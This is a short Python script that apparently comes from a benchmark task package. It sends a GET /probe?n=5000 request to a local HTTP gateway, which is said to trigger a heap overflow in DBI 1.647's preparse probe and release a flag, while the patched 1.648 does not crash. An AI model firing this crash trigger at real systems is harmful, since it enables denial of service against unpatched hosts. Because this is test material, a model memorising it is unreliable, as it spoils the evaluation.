#!/usr/bin/env python3
"""[GIVEN] CVE-2026-10879 seed exploit for dbi-cve-2026-14739 (HTTP gateway).

Sends GET /probe?n=5000 to the HTTP gateway wrapping the DBI preparse probe.
On V0 (DBI 1.647) the probe crashes (heap overflow) and the flag is released.
On V1 (DBI 1.648, CVE-2026-10879 fix) the probe completes cleanly, no flag.
"""
import json
import os
import urllib.request

SEED_N = 5000


def candidate(*, version="v1", flag=None):
    host = os.environ.get("PCB_HOST", "127.0.0.1")
    port = os.environ.get("PCB_PORT", "39504")
    url = f"http://{host}:{port}/probe?n={SEED_N}"
    try:
        resp = urllib.request.urlopen(url, timeout=200)
        data = json.loads(resp.read())
        flag_val = data.get("flag", "")
        if flag_val:
            print(f"FLAG: {flag_val}")
        return {"ok": data.get("crashed", False), "crashed": data["crashed"], "result": data}
    except Exception as e:
        return {"ok": False, "crashed": None, "result": str(e)}


if __name__ == "__main__":
    import sys
    result = candidate(version=sys.argv[1] if len(sys.argv) > 1 else "v1")
    print(json.dumps(result, default=str))
